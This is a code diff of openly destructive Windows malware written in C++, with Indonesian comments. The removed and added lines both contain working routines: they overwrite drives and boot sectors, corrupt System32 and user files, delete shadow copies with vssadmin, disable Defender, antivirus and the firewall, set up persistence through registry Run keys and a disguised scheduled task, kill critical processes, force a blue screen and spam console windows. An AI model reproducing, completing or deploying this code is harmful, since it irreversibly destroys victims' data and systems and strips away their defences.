-        wchar_t caption[] = L"CRITICAL SYSTEM FAILURE";
-        wchar_t message[] = L"Bootloader corrupted. System integrity compromised. Contact administrator.";
-        RegSetValueExW(hKey, L"legalnoticecaption", 0, REG_SZ, (BYTE*)caption, (wcslen(caption) + 1) * sizeof(wchar_t));
-        RegSetValueExW(hKey, L"legalnoticetext", 0, REG_SZ, (BYTE*)message, (wcslen(message) + 1) * sizeof(wchar_t));
-        RegCloseKey(hKey);
-    }
-}
-
-void WipeAllDrives() {
-    const int BUFFER_SIZE = 1024 * 1024; // 1MB buffer
-    BYTE* wipeBuffer = new BYTE[BUFFER_SIZE];
-    for (int i = 0; i < BUFFER_SIZE; i++) {
-        wipeBuffer[i] = rand() % 256;
-    }
-
+void CorruptBootSectorAdvanced() {
+    // Corrupt boot sector di semua drive
     for (int driveNum = 0; driveNum < 8; driveNum++) {
         wchar_t devicePath[50];
         wsprintfW(devicePath, L"\\\\.\\PhysicalDrive%d", driveNum);
@@ -557,95 +443,259 @@ void WipeAllDrives() {
             FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
         
         if (hDevice != INVALID_HANDLE_VALUE) {
-            DISK_GEOMETRY_EX dg = {0};
-            DWORD bytesReturned = 0;
-            if (DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, 
-                NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
-                
-                LARGE_INTEGER diskSize = dg.DiskSize;
-                LARGE_INTEGER totalWritten = {0};
-                
-                while (totalWritten.QuadPart < diskSize.QuadPart) {
-                    DWORD bytesToWrite = (diskSize.QuadPart - totalWritten.QuadPart > BUFFER_SIZE) 
-                        ? BUFFER_SIZE : diskSize.QuadPart - totalWritten.QuadPart;
-                    
-                    DWORD bytesWritten;
-                    WriteFile(hDevice, wipeBuffer, bytesToWrite, &bytesWritten, NULL);
-                    totalWritten.QuadPart += bytesWritten;
-                }
+            // Overwrite first 1000 sectors
+            const DWORD sectorsToCorrupt = 1000;
+            const DWORD bufferSize = 512 * sectorsToCorrupt;
+            BYTE* garbageBuffer = new BYTE[bufferSize];
+            
+            for (DWORD i = 0; i < bufferSize; i++) {
+                garbageBuffer[i] = static_cast<BYTE>(rand() % 256);
             }
+            
+            DWORD bytesWritten;
+            WriteFile(hDevice, garbageBuffer, bufferSize, &bytesWritten, NULL);
+            FlushFileBuffers(hDevice);
+            
+            delete[] garbageBuffer;
             CloseHandle(hDevice);
         }
     }
-    
-    delete[] wipeBuffer;
 }
 
-void ExecuteDestructiveActions() {
+void DisableAllSecurityFeatures() {
+    // Nonaktifkan Windows Defender secara permanen
+    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+    if (scm) {
+        const wchar_t* securityServices[] = {
+            L"WinDefend", L"WdNisSvc", L"SecurityHealthService", L"wscsvc",
+            L"MsMpSvc", L"McAfeeFramework", L"McTaskManager", L"Sophos Agent",
+            L"Sophos Anti-Virus", L"Symantec AntiVirus", L"avp", L"ekrn",
+            L"bdagent", L"AVP", L"ccEvtMgr", L"ccSetMgr", L"SavService"
+        };
+        
+        for (int i = 0; i < sizeof(securityServices)/sizeof(securityServices[0]); i++) {
+            SC_HANDLE service = OpenServiceW(scm, securityServices[i], SERVICE_ALL_ACCESS);
+            if (service) {
+                SERVICE_STATUS status;
+                ControlService(service, SERVICE_CONTROL_STOP, &status);
+                
+                // Set service ke disabled
+                SERVICE_CONFIG config;
+                DWORD bytesReturned;
+                QueryServiceConfig(service, &config, sizeof(config), &bytesReturned);
+                config.dwStartType = SERVICE_DISABLED;
+                ChangeServiceConfig(service, SERVICE_NO_CHANGE, SERVICE_DISABLED, 
+                                   SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+                
+                CloseServiceHandle(service);
+            }
+        }
+        CloseServiceHandle(scm);
+    }
+
+    // Nonaktifkan via registry
+    HKEY hKey;
+    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
+        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 
+        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD disable = 1;
+        RegSetValueExW(hKey, L"DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegSetValueExW(hKey, L"DisableAntiVirus", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegSetValueExW(hKey, L"DisableRoutinelyTakingAction", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegCloseKey(hKey);
+    }
+
+    // Nonaktifkan real-time protection
+    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
+        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 
+        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD disable = 0;
+        RegSetValueExW(hKey, L"DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegSetValueExW(hKey, L"DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegSetValueExW(hKey, L"DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegSetValueExW(hKey, L"DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegSetValueExW(hKey, L"DisableIOAVProtection", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegCloseKey(hKey);
+    }
+
+    // Nonaktifkan Windows Firewall
+    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
+        L"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", 
+        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD disable = 0;
+        RegSetValueExW(hKey, L"EnableFirewall", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegCloseKey(hKey);
+    }
+}
+
+void DestroySystemRestore() {
+    // Hapus semua restore points
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CreateProcessW(NULL, L"vssadmin delete shadows /all /quiet", 
+                 NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    WaitForSingleObject(pi.hProcess, 10000);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    // Nonaktifkan System Restore
+    HKEY hKey;
+    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
+        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", 
+        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        DWORD disable = 0;
+        RegSetValueExW(hKey, L"DisableSR", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
+        RegCloseKey(hKey);
+    }
+
+    // Hapus folder System Volume Information
+    wchar_t sysVolInfo[] = L"C:\\System Volume Information";
+    SHFILEOPSTRUCTW fileOp = {
+        NULL, FO_DELETE, sysVolInfo, L"", 
+        FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT, 
+        FALSE, NULL, L""
+    };
+    SHFileOperationW(&fileOp);
+}
+
+void CorruptUserProfiles() {
+    wchar_t userProfilePath[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfilePath))) {
+        WIN32_FIND_DATAW fd;
+        wchar_t searchPath[MAX_PATH];
+        wsprintfW(searchPath, L"%s\\*", userProfilePath);
+        
+        HANDLE hFind = FindFirstFileW(searchPath, &fd);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && 
+                    wcscmp(fd.cFileName, L".") != 0 && wcscmp(fd.cFileName, L"..") != 0) {
+                    
+                    wchar_t userDir[MAX_PATH];
+                    wsprintfW(userDir, L"%s\\%s", userProfilePath, fd.cFileName);
+                    
+                    // Corrupt semua file di folder user
+                    WIN32_FIND_DATAW userFd;
+                    wchar_t userSearchPath[MAX_PATH];
+                    wsprintfW(userSearchPath, L"%s\\*", userDir);
+                    
+                    HANDLE hUserFind = FindFirstFileW(userSearchPath, &userFd);
+                    if (hUserFind != INVALID_HANDLE_VALUE) {
+                        do {
+                            if (!(userFd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                                wchar_t userFilePath[MAX_PATH];
+                                wsprintfW(userFilePath, L"%s\\%s", userDir, userFd.cFileName);
+                                
+                                HANDLE hFile = CreateFileW(userFilePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+                                if (hFile != INVALID_HANDLE_VALUE) {
+                                    DWORD fileSize = GetFileSize(hFile, NULL);
+                                    if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
+                                        BYTE* buffer = new BYTE[fileSize];
+                                        for (DWORD j = 0; j < fileSize; j++) {
+                                            buffer[j] = static_cast<BYTE>(rand() % 256);
+                                        }
+                                        DWORD written;
+                                        WriteFile(hFile, buffer, fileSize, &written, NULL);
+                                        delete[] buffer;
+                                    }
+                                    CloseHandle(hFile);
+                                }
+                            }
+                        } while (FindNextFileW(hUserFind, &userFd));
+                        FindClose(hUserFind);
+                    }
+                }
+            } while (FindNextFileW(hFind, &fd));
+            FindClose(hFind);
+        }
+    }
+}
+
+void ExecuteAdvancedDestructiveActions() {
     if (destructiveActionsTriggered) return;
     destructiveActionsTriggered = true;
 
     // Privileged actions (admin only)
     if (g_isAdmin) {
-        ClearEventLogs();
-        ClearShadowCopies();
-        CorruptBootFiles();
-        CorruptKernelFiles();
-        DestroyMBR();
-        DestroyGPT();
-        SetCustomBootFailure();
-        WipeAllDrives();
-        DisableWindowsDefender();
+        DestroyMBRWithPattern();
+        DestroyGPTCompletely();
+        DestroyRegistryCompletely();
+        DisableAllSystemFeatures();
+        SetCriticalProcessPermanent();
+        WipeSystemFilesCompletely();
+        CorruptBootSectorAdvanced();
+        DisableAllSecurityFeatures();
+        DestroySystemRestore();
     }
 
     // Non-privileged actions
-    WipeRemovableMedia();
+    CorruptUserProfiles();
+    KillAllProcesses();
 }
 
-// ======== FUNGSI SUARA & EFEK VISUAL ========
-void PlayGlitchSoundAsync() {
+// ======== FUNGSI SUARA & EFEK VISUAL YANG LEBIH KUAT ========
+void PlayAdvancedGlitchSound() {
     std::thread([]() {
-        int soundType = rand() % 25;
+        int soundType = rand() % 30;
         
         switch (soundType) {
-        case 0: case 1: case 2: case 3:
+        case 0: case 1: case 2:
             PlaySound(TEXT("SystemHand"), NULL, SND_ALIAS | SND_ASYNC);
             break;
-        case 4: case 5:
+        case 3: case 4:
             PlaySound(TEXT("SystemExclamation"), NULL, SND_ALIAS | SND_ASYNC);
             break;
-        case 6: case 7:
-            Beep(rand() % 4000 + 500, rand() % 100 + 30);
+        case 5: case 6:
+            Beep(rand() % 5000 + 500, rand() % 200 + 50);
             break;
-        case 8: case 9:
-            for (int i = 0; i < 50; i++) {
-                Beep(rand() % 5000 + 500, 15);
-                Sleep(3);
-            }
-            break;
-        case 10: case 11:
-            Beep(rand() % 100 + 30, rand() % 400 + 200);
-            break;
-        case 12: case 13:
-            for (int i = 0; i < 30; i++) {
-                Beep(rand() % 4000 + 500, rand() % 30 + 10);
+        case 7: case 8:
+            for (int i = 0; i < 100; i++) {
+                Beep(rand() % 6000 + 500, 20);
                 Sleep(2);
             }
             break;
-        case 14: case 15:
-            for (int i = 0; i < 300; i += 3) {
-                Beep(300 + i * 15, 8);
+        case 9: case 10:
+            Beep(rand() % 200 + 30, rand() % 500 + 300);
+            break;
+        case 11: case 12:
+            for (int i = 0; i < 50; i++) {
+                Beep(rand() % 5000 + 500, rand() % 40 + 15);
+                Sleep(1);
             }
             break;
-        case 16: case 17:
-            for (int i = 0; i < 10; i++) {
-                Beep(50 + i * 100, 200);
+        case 13: case 14:
+            for (int i = 0; i < 500; i += 5) {
+                Beep(300 + i * 20, 10);
+            }
+            break;
+        case 15: case 16:
+            for (int i = 0; i < 15; i++) {
+                Beep(50 + i * 150, 250);
+            }
+            break;
+        case 17: case 18:
+            // Suara distortion tinggi
+            for (int i = 0; i < 200; i++) {
+                Beep(rand() % 8000 + 1000, 10);
+                Sleep(1);
+            }
+            break;
+        case 19: case 20:
+            // Suara frekuensi rendah
+            for (int i = 0; i < 20; i++) {
+                Beep(50 + i * 10, 400);
             }
             break;
         default:
-            for (int i = 0; i < 70; i++) {
-                Beep(rand() % 6000 + 500, 20);
-                Sleep(1);
+            // Kombinasi kompleks
+            for (int i = 0; i < 3; i++) {
+                for (int j = 0; j < 50; j++) {
+                    Beep(200 + j * 100, 15);
+                }
+                Sleep(100);
+                for (int j = 0; j < 30; j++) {
+                    Beep(2000 - j * 50, 20);
+                }
             }
             break;
         }
@@ -987,298 +1037,132 @@ void ApplyInversionWaves() {
     }
 }
 
-// ======== FUNGSI PERSISTENSI & DESTRUKSI ========
-BOOL IsWindows64() {
-    BOOL bIsWow64 = FALSE;
-    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
-        GetModuleHandle(TEXT("kernel32")), "IsWow64Process");
+void ApplyAdvancedScreenDistortion() {
+    if (!pPixels) return;
     
-    if (fnIsWow64Process) {
-        fnIsWow64Process(GetCurrentProcess(), &bIsWow64);
-    }
-    return bIsWow64;
-}
-
-void InstallPersistence() {
-    wchar_t szPath[MAX_PATH];
-    GetModuleFileNameW(NULL, szPath, MAX_PATH);
+    // Efek distorsi gelombang kompleks
+    int centerX = rand() % screenWidth;
+    int centerY = rand() % screenHeight;
+    int maxRadius = 200 + rand() % 800;
+    float speed = 0.2f + (rand() % 200) / 100.0f;
+    DWORD currentTime = GetTickCount();
     
-    wchar_t targetPath[MAX_PATH];
-    if (g_isAdmin) {
-        GetSystemDirectoryW(targetPath, MAX_PATH);
-        lstrcatW(targetPath, L"\\winlogon_helper.exe");
-    } else {
-        SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, targetPath);
-        lstrcatW(targetPath, L"\\system_health.exe");
-    }
-    
-    // Handle Wow64 redirection untuk Windows 64-bit
-    PVOID oldRedir = NULL;
-    if (IsWindows64()) {
-        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
-        if (hKernel32) {
-            LPFN_Wow64DisableWow64FsRedirection pfnDisable = 
-                reinterpret_cast<LPFN_Wow64DisableWow64FsRedirection>(
-                    GetProcAddress(hKernel32, "Wow64DisableWow64FsRedirection"));
-            if (pfnDisable) pfnDisable(&oldRedir);
-        }
-    }
-    
-    CopyFileW(szPath, targetPath, FALSE);
-    
-    HKEY hKey;
-    if (g_isAdmin) {
-        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
-    } else {
-        RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
-                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
-    }
-    RegSetValueExW(hKey, L"SystemHealthMonitor", 0, REG_SZ, (BYTE*)targetPath, (lstrlenW(targetPath) + 1) * sizeof(wchar_t));
-    RegCloseKey(hKey);
-    
-    SYSTEMTIME st;
-    GetLocalTime(&st);
-    
-    wchar_t cmd[1024];
-    wsprintfW(cmd, 
-        L"schtasks /create /tn \"Windows Integrity Check\" /tr \"\\\"%s\\\"\" /sc minute /mo 1 /st %02d:%02d /f",
-        targetPath, st.wHour, st.wMinute);
-    
-    // Ganti WinExec dengan CreateProcess
-    STARTUPINFOW si = {};
-    si.cb = sizeof(si);
-    PROCESS_INFORMATION pi;
-    CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    WaitForSingleObject(pi.hProcess, INFINITE);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    
-    // Revert redirection
-    if (oldRedir && IsWindows64()) {
-        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
-        if (hKernel32) {
-            LPFN_Wow64RevertWow64FsRedirection pfnRevert = 
-                reinterpret_cast<LPFN_Wow64RevertWow64FsRedirection>(
-                    GetProcAddress(hKernel32, "Wow64RevertWow64FsRedirection"));
-            if (pfnRevert) pfnRevert(oldRedir);
-        }
-    }
-    
-    persistenceInstalled = true;
-}
-
-void DisableSystemTools() {
-    HKEY hKey;
-    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
-                   0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
-    DWORD value = 1;
-    RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-    RegCloseKey(hKey);
-    
-    RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
-                   0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
-    RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-    RegCloseKey(hKey);
-    
-    if (g_isAdmin) {
-        RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
-                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
-        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-        RegSetValueExW(hKey, L"DisableRegistryTools", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-        RegCloseKey(hKey);
-    }
-    
-    disableTaskManager = true;
-    disableRegistryTools = true;
-}
-
-void CorruptSystemFiles() {
-    const wchar_t* targets[] = {
-        L"C:\\Windows\\System32\\drivers\\*.sys",
-        L"C:\\Windows\\System32\\*.dll",
-        L"C:\\Windows\\System32\\*.exe",
-        L"C:\\Windows\\System32\\config\\*"
-    };
-    
-    // Handle Wow64 redirection untuk Windows 64-bit
-    PVOID oldRedir = NULL;
-    if (IsWindows64()) {
-        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
-        if (hKernel32) {
-            LPFN_Wow64DisableWow64FsRedirection pfnDisable = 
-                reinterpret_cast<LPFN_Wow64DisableWow64FsRedirection>(
-                    GetProcAddress(hKernel32, "Wow64DisableWow64FsRedirection"));
-            if (pfnDisable) pfnDisable(&oldRedir);
-        }
-    }
-    
-    for (size_t i = 0; i < sizeof(targets)/sizeof(targets[0]); i++) {
-        WIN32_FIND_DATAW fd;
-        HANDLE hFind = FindFirstFileW(targets[i], &fd);
-        
-        if (hFind != INVALID_HANDLE_VALUE) {
-            do {
-                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
-                    wchar_t filePath[MAX_PATH];
-                    if (i == 0) {
-                        wsprintfW(filePath, L"C:\\Windows\\System32\\drivers\\%s", fd.cFileName);
-                    } else if (i == 3) {
-                        wsprintfW(filePath, L"C:\\Windows\\System32\\config\\%s", fd.cFileName);
-                    } else {
-                        wsprintfW(filePath, L"C:\\Windows\\System32\\%s", fd.cFileName);
-                    }
-                    
-                    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-                    if (hFile != INVALID_HANDLE_VALUE) {
-                        DWORD fileSize = GetFileSize(hFile, NULL);
-                        if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                            BYTE* buffer = new BYTE[fileSize];
-                            if (buffer) {
-                                for (DWORD j = 0; j < fileSize; j++) {
-                                    buffer[j] = rand() % 256;
-                                }
-                                
-                                DWORD written;
-                                WriteFile(hFile, buffer, fileSize, &written, NULL);
-                                
-                                delete[] buffer;
-                            }
-                        }
-                        CloseHandle(hFile);
-                    }
-                }
-            } while (FindNextFileW(hFind, &fd));
-            FindClose(hFind);
-        }
-    }
-    
-    // Revert redirection
-    if (oldRedir && IsWindows64()) {
-        HMODULE hKernel32 = GetModuleHandle(TEXT("kernel32"));
-        if (hKernel32) {
-            LPFN_Wow64RevertWow64FsRedirection pfnRevert = 
-                reinterpret_cast<LPFN_Wow64RevertWow64FsRedirection>(
-                    GetProcAddress(hKernel32, "Wow64RevertWow64FsRedirection"));
-            if (pfnRevert) pfnRevert(oldRedir);
-        }
-    }
-    
-    fileCorruptionActive = true;
-}
-
-void KillCriticalProcesses() {
-    const wchar_t* targets[] = {
-        L"taskmgr.exe",
-        L"explorer.exe",
-        L"msconfig.exe",
-        L"cmd.exe",
-        L"powershell.exe",
-        L"regedit.exe",
-        L"mmc.exe",
-        L"services.exe",
-        L"svchost.exe",
-        L"winlogon.exe"
-    };
-    
-    DWORD processes[1024], cbNeeded;
-    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
-        DWORD cProcesses = cbNeeded / sizeof(DWORD);
-        
-        for (DWORD i = 0; i < cProcesses; i++) {
-            wchar_t szProcessName[MAX_PATH] = L"<unknown>";
+    for (int y = 0; y < screenHeight; y++) {
+        for (int x = 0; x < screenWidth; x++) {
+            float dx = static_cast<float>(x - centerX);
+            float dy = static_cast<float>(y - centerY);
+            float dist = sqrt(dx*dx + dy*dy);
             
-            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, FALSE, processes[i]);
-            if (hProcess) {
-                HMODULE hMod;
-                DWORD cbNeeded;
+            if (dist < maxRadius) {
+                float wave1 = sin(dist * 0.05f - currentTime * 0.003f * speed);
+                float wave2 = cos(dist * 0.1f + currentTime * 0.005f * speed);
+                float wave3 = sin(dist * 0.02f - currentTime * 0.007f * speed);
                 
-                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
-                    GetModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(wchar_t));
-                    
-                    for (size_t j = 0; j < sizeof(targets)/sizeof(targets[0]); j++) {
-                        if (lstrcmpiW(szProcessName, targets[j]) == 0) {
-                            TerminateProcess(hProcess, 0);
-                            break;
-                        }
+                float combinedWave = (wave1 + wave2 + wave3) / 3.0f;
+                
+                if (combinedWave > 0.6f) {
+                    int pos = (y * screenWidth + x) * 4;
+                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
+                        // Shift warna ekstrim
+                        pPixels[pos] = (pPixels[pos] + 150) % 256;
+                        pPixels[pos + 1] = (pPixels[pos + 1] + 50) % 256;
+                        pPixels[pos + 2] = (pPixels[pos + 2] + 200) % 256;
+                    }
+                } else if (combinedWave < -0.6f) {
+                    int pos = (y * screenWidth + x) * 4;
+                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
+                        // Inversi warna
+                        pPixels[pos] = 255 - pPixels[pos];
+                        pPixels[pos + 1] = 255 - pPixels[pos + 1];
+                        pPixels[pos + 2] = 255 - pPixels[pos + 2];
                     }
                 }
-                CloseHandle(hProcess);
             }
         }
     }
-    
-    processKillerActive = true;
 }
 
-void TriggerBSOD() {
-    HMODULE ntdll = GetModuleHandle(TEXT("ntdll.dll"));
-    if (ntdll) {
-        typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
-        pdef_NtRaiseHardError NtRaiseHardError = 
-            reinterpret_cast<pdef_NtRaiseHardError>(GetProcAddress(ntdll, "NtRaiseHardError"));
-        
-        if (NtRaiseHardError) {
-            ULONG Response;
-            NTSTATUS status = STATUS_FLOAT_MULTIPLE_FAULTS;
-            NtRaiseHardError(status, 0, 0, 0, 6, &Response);
+void ApplyDataBleedEffect() {
+    // Efek dimana data dari satu area "bleed" ke area lain
+    int bleedSourceX = rand() % screenWidth;
+    int bleedSourceY = rand() % screenHeight;
+    int bleedRadius = 100 + rand() % 400;
+    int bleedIntensity = 10 + intensityLevel * 5;
+    
+    for (int y = 0; y < screenHeight; y++) {
+        for (int x = 0; x < screenWidth; x++) {
+            float dx = static_cast<float>(x - bleedSourceX);
+            float dy = static_cast<float>(y - bleedSourceY);
+            float dist = sqrt(dx*dx + dy*dy);
+            
+            if (dist < bleedRadius && rand() % 100 < bleedIntensity) {
+                int targetX = x + (rand() % 41 - 20);
+                int targetY = y + (rand() % 41 - 20);
+                
+                if (targetX >= 0 && targetX < screenWidth && targetY >= 0 && targetY < screenHeight) {
+                    int srcPos = (y * screenWidth + x) * 4;
+                    int dstPos = (targetY * screenWidth + targetX) * 4;
+                    
+                    if (srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 &&
+                        dstPos >= 0 && dstPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
+                        pPixels[dstPos] = pPixels[srcPos];
+                        pPixels[dstPos + 1] = pPixels[srcPos + 1];
+                        pPixels[dstPos + 2] = pPixels[srcPos + 2];
+                    }
+                }
+            }
         }
     }
+}
+
+void ApplyMatrixRainEffect() {
+    // Efek hujan matrix style yang lebih intens
+    static std::vector<int> columnHeights(screenWidth, 0);
+    static std::vector<DWORD> columnTimes(screenWidth, 0);
     
-    // Fallback: Cause access violation
-    int* p = (int*)0x1;
-    *p = 0;
-}
-
-// ======== FUNGSI POPUP & DESTRUKSI ========
-void OpenRandomPopups() {
-    const wchar_t* commands[] = {
-        L"cmd.exe /k \"@echo off && title CORRUPTED_SYSTEM && color 0a && echo WARNING: SYSTEM INTEGRITY COMPROMISED && for /l %x in (0,0,0) do start /min cmd /k \"echo CRITICAL FAILURE %random% && ping 127.0.0.1 -n 2 > nul && exit\"\"",
-        L"powershell.exe -NoExit -Command \"while($true) { Write-Host 'R͏͏҉̧҉U̸N̕͢N̢҉I͠N̶G̵ ͠C̴O̕R͟R̨U̕P̧T͜ED̢ ̸C̵ÒD̸E' -ForegroundColor (Get-Random -InputObject ('Red','Green','Yellow')); Start-Sleep -Milliseconds 200 }\"",
-        L"notepad.exe",
-        L"explorer.exe",
-        L"write.exe",
-        L"calc.exe",
-        L"mspaint.exe",
-        L"regedit.exe",
-        L"taskmgr.exe",
-        L"control.exe"
-    };
-
-    int numPopups = 3 + rand() % 5; // 3-7 popup sekaligus
-    bool spawnSpam = (rand() % 3 == 0); // 33% chance spawn cmd spammer
-
-    for (int i = 0; i < numPopups; i++) {
-        int cmdIndex = rand() % (sizeof(commands)/sizeof(commands[0]));
-        
-        // Untuk cmd spam khusus
-        if (spawnSpam && i == 0) {
-            ShellExecuteW(NULL, L"open", L"cmd.exe", 
-                L"/c start cmd.exe /k \"@echo off && title SYSTEM_FAILURE && for /l %x in (0,0,0) do start /min cmd /k echo ͏҉̷̸G҉̢L͠I͏̵T́C̶H͟ ̀͠D͠E͜T̷ÉC̵T̨E̵D͜ %random% && timeout 1 > nul\"", 
-                NULL, SW_SHOWMINIMIZED);
-            continue;
+    DWORD currentTime = GetTickCount();
+    
+    for (int x = 0; x < screenWidth; x++) {
+        if (currentTime - columnTimes[x] > 50) {
+            columnHeights[x] = (columnHeights[x] + 1) % screenHeight;
+            columnTimes[x] = currentTime;
         }
-
-        SHELLEXECUTEINFOW sei = { sizeof(sei) };
-        sei.lpVerb = L"open";
-        sei.lpFile = L"cmd.exe";
-        sei.lpParameters = commands[cmdIndex];
-        sei.nShow = (rand() % 2) ? SW_SHOWMINIMIZED : SW_SHOWNORMAL;
-        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
         
-        ShellExecuteExW(&sei);
-        if (sei.hProcess) CloseHandle(sei.hProcess);
-        
-        Sleep(100); // Delay antar popup
-    }
-
-    // Spawn khusus Windows Terminal jika ada
-    if (rand() % 5 == 0) {
-        ShellExecuteW(NULL, L"open", L"wt.exe", NULL, NULL, SW_SHOW);
+        int y = columnHeights[x];
+        for (int i = 0; i < 20; i++) {
+            int currentY = (y - i + screenHeight) % screenHeight;
+            int pos = (currentY * screenWidth + x) * 4;
+            
+            if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
+                if (i == 0) {
+                    // Karakter terang di kepala
+                    pPixels[pos] = 255;
+                    pPixels[pos + 1] = 255;
+                    pPixels[pos + 2] = 255;
+                } else if (i < 5) {
+                    // Gradien hijau
+                    int intensity = 255 - (i * 50);
+                    pPixels[pos] = 0;
+                    pPixels[pos + 1] = intensity;
+                    pPixels[pos + 2] = 0;
+                } else if (i < 10) {
+                    // Gradien lebih gelap
+                    int intensity = 155 - ((i - 5) * 30);
+                    pPixels[pos] = 0;
+                    pPixels[pos + 1] = intensity;
+                    pPixels[pos + 2] = 0;
+                } else {
+                    // Sisa ekor
+                    pPixels[pos] = 0;
+                    pPixels[pos + 1] = 50;
+                    pPixels[pos + 2] = 0;
+                }
+            }
+        }
     }
 }
 
-void ApplyGlitchEffect() {
+void ApplyAdvancedGlitchEffect() {
     if (!pPixels) return;
     
     BYTE* pCopy = new (std::nothrow) BYTE[screenWidth * screenHeight * 4];
@@ -1286,13 +1170,13 @@ void ApplyGlitchEffect() {
     memcpy(pCopy, pPixels, screenWidth * screenHeight * 4);
     
     DWORD currentTime = GetTickCount();
-    int timeIntensity = 1 + static_cast<int>((currentTime - startTime) / 5000);
-    intensityLevel = std::min(20, timeIntensity);
+    int timeIntensity = 1 + static_cast<int>((currentTime - startTime) / 3000); // Lebih cepat peningkatan
